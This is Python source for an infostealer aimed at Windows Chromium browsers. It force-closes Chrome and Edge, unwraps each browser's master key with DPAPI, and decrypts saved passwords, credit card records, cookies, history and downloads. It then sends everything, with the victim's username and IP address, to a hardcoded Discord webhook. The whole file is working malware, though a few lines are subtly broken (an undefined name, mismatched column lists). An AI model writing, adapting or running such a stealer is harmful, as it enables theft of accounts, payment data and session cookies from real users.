import os
import sqlite3
import win32crypt
import json
from base64 import b64decode
from Crypto.Cipher import AES
import requests
import getpass
import socket
import psutil
from datetime import datetime, timedelta
import time

def force_quit_browser_processes():
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'] in ['chrome.exe', 'msedge.exe']:
            proc.kill()

def get_master_key(path: str):
    if not os.path.exists(path):
        return None
    local_state_path = os.path.join(path, "Local State")
    if not os.path.exists(local_state_path):
        return None
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)
    if "os_crypt" not in local_state:
        return None
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = win32crypt.CryptUnprotectData(encrypted_key[5:], None, None, None, 0)[1]
    return master_key

def decrypt_password(buff: bytes, key: bytes) -> str:
    if len(buff) == 0:
        return ""
    if len(buff) < 16:
        raise ValueError("Cipher text is too short")
    iv = buff[3:15]
    payload = buff[15:-16]
    tag = buff[-16:]
    cipher = AES.new(key, AES.MODE_GCM, iv)
    decrypted_pass = cipher.decrypt_and_verify(payload, tag).decode()
    return decrypted_pass

def get_data_with_retry(path: str, profile: str, key, type_of_data):
    max_retries = 3
    retry_delay = 0.1
    retry_count = 0
    while retry_count < max_retries:
        try:
            return get_data(path, profile, key, type_of_data)
        except sqlite3.OperationalError as e:
            if "database is locked" in str(e):
                time.sleep(retry_delay)
                retry_count += 1
            else:
                raise e
    raise Exception("Max retries exceeded. Unable to retrieve data.")

def get_data(path: str, profile: str, key, type_of_data):
    db_file = os.path.join(path, f'{profile}{type_of_data["file"]}')
    if not os.path.exists(db_file):
        return None
    result = ""
    conn = sqlite3.connect(db_file)
    cursor = conn.cursor()
    cursor.execute(type_of_data['query'])
    for row in cursor.fetchall():
        row = list(row)
        if type_of_data['decrypt']:
            row = [decrypt_password(cell, key) if isinstance(cell, bytes) else cell for cell in row]
            if type_of_data['name'] == 'history' and row[2] != 0:
                row[2] = convert_chrome_time(row[2])
        result += "\n".join([f"{col}: {val}" for col, val in zip(type_of_data['columns'], row)]) + "\n\n"
    conn.close()
    return result

def convert_chrome_time(chrome_time):
    return (datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)).strftime('%d/%m/%Y %H:%M:%S')

def send_to_webhook(browser_name, data_type_name, content):
    webhook_url = "https://discord.com/api/webhooks/1396114728497188955/el1tR6M760YCZYK4biJUev2L-Y8ZNEZjM_Frq0_8nBIkyTibJkyhDqSR599QBPr8L2kA"
    username = getpass.getuser()
    ip_address = socket.gethostbyname(socket.gethostname())
    header = f"**{browser_name} {data_type_name.replace('_', ' ').capitalize()}**\nUser: {username}\nIP: {ip_address}\n\n"
    if not content:
        content = "No data found"
    
    # Split into chunks for Discord's 2000-char limit
    max_length = 1900
    current_message = header + content
    messages = []
    while len(current_message) > max_length:
        split_point = current_message[:max_length].rfind('\n\n')
        if split_point == -1:
            split_point = max_length
        messages.append(current_message[:split_point])
        current_message = header + current_message[split_point:].lstrip()
    messages.append(current_message)

    # Send each message
    for message in messages:
        try:
            response = requests.post(webhook_url, json={"content": message})
            if response.status_code != 204:
                print(f"Webhook error for {browser_name} {data_type_name}: HTTP {response.status_code}")
        except Exception as e:
            print(f"Webhook error for {browser_name} {data_type_name}: {str(e)}")

def installed_browsers():
    appdata = os.getenv('LOCALAPPDATA')
    browsers = {
        'avast': appdata + '\\AVAST Software\\Browser\\User Data',
        'amigo': appdata + '\\Amigo\\User Data',
        'torch': appdata + '\\Torch\\User Data',
        'kometa': appdata + '\\Kometa\\User Data',
        'orbitum': appdata + '\\Orbitum\\User Data',
        'cent-browser': appdata + '\\CentBrowser\\User Data',
        '7star': appdata + '\\7Star\\7Star\\User Data',
        'sputnik': appdata + '\\Sputnik\\Sputnik\\User Data',
        'vivaldi': appdata + '\\Vivaldi\\User Data',
        'google-chrome-sxs': appdata + '\\Google\\Chrome SxS\\User Data',
        'google-chrome': appdata + '\\Google\\Chrome\\User Data',
        'epic-privacy-browser': appdata + '\\Epic Privacy Browser\\User Data',
        'microsoft-edge': appdata + '\\Microsoft\\Edge\\User Data',
        'uran': appdata + '\\uCozMedia\\Uran\\User Data',
        'yandex': appdata + '\\Yandex\\YandexBrowser\\User Data',
        'brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
        'iridium': appdata + '\\Iridium\\User Data',
    }
    return [browser for browser, path in browsers.items() if os.path.exists(path)]

data_queries = {
    'login_data': {
        'name': 'login_data',
        'query': 'SELECT action_url, username_value, password_value FROM logins',
        'file': '\\Login Data',
        'columns': ['URL', 'Email', 'Password'],
        'decrypt': True
    },
    'credit_cards': {
        'name': 'credit_cards',
        'query': 'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards',
        'file': '\\Web Data',
        'columns': ['Name On Card', 'Card Number', 'Expires On', 'Added On'],
        'decrypt': True
    },
    'cookies': {
        'name': 'cookies',
        'query': 'SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies',
        'file': '\\Network\\Cookies',
        'columns': ['Host Key', 'Cookie Name', 'Path', 'Cookie', 'Expires On'],
        'decrypt': True
    },
    'history': {
        'name': 'history',
        'query': 'SELECT url, title, last_visit_time FROM urls',
        'file': '\\History',
        'columns': ['URL', 'Title', 'Visited Time'],
        'decrypt': True
    },
    'downloads': {
        'name': 'downloads',
        'query': 'SELECT tab_url, target_path FROM downloads',
        'file': '\\History',
        'columns': ['Download URL', 'Local Path'],
        'decrypt': True
    }
}

if __name__ == "__main__":
    force_quit_browser_processes()
    available_browsers = installed_browsers()
    for browser in available_browsers:
        browser_path = browsers[browser]
        master_key = get_master_key(browser_path)
        if master_key is None:
            send_to_webhook(browser, "error", f"Master key not found for {browser}")
            continue
        for data_type_name, data_type in data_queries.items():
            data = get_data_with_retry(browser_path, "Default", master_key, data_type)
            send_to_webhook(browser, data_type_name, data)
